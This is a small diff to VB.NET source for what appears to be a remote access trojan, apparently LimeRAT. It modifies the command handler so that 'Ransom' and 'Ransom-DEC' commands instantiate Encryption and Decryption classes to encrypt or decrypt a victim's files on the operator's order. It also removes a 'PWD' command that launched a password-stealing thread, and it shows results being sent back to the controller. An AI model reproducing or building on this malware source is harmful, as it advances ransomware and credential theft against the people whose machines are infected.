@@ -54,9 +54,11 @@ Namespace Lime
                    '###############################################################################
                    '###############################################################################
                     Case "Ransom"
-                        BeforeAttack(A(1), A(2))
+                        Dim enc As New Encryption
+                        enc.BeforeAttack(A(1), A(2))
                     Case "Ransom-DEC"
-                        Dec(A(1))
+                        Dim Dec As New Decryption
+                        Dec.BeforeDec(A(1))
                    '###############################################################################
                     Case "Processes"
                         Dim S As String = "Processes"
@@ -70,9 +72,6 @@ Namespace Lime
                         Catch ex As Exception
                             C.Send("MSG" & C.SPL & "[VISIT] " & ex.Message)
                         End Try
-                    Case "PWD"
-                        Dim T1 As New Threading.Thread(AddressOf PWD.Begin)
-                        T1.Start()
                 End Select
             Catch ex As Exception
 
